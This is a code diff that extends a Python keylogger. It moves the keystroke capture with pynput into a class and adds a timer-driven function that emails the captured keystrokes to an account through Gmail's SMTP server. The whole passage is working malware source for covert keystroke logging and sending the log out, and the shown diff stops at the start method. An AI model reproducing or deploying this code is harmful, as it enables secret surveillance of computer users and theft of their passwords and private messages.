@@ -1,29 +1,45 @@
 #!/usr/bin/env python
 import pynput.keyboard
 import threading
-
-log = ""
+import smtplib
 
 
 class Keylogger:
 
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger Started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+# constructor method gets executed whenever a object is created
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
     def process_key_press(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+
+        self.append_to_log(current_key)
+
     # in here you are converting key to char and if its special character like space it wont convert it to char to not have error
         # print(log)
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", "587")
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def report(self):
-        global log
-        print(log)
-        log = ""
-        timer = threading.Timer(5, self.report)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
     def start(self):
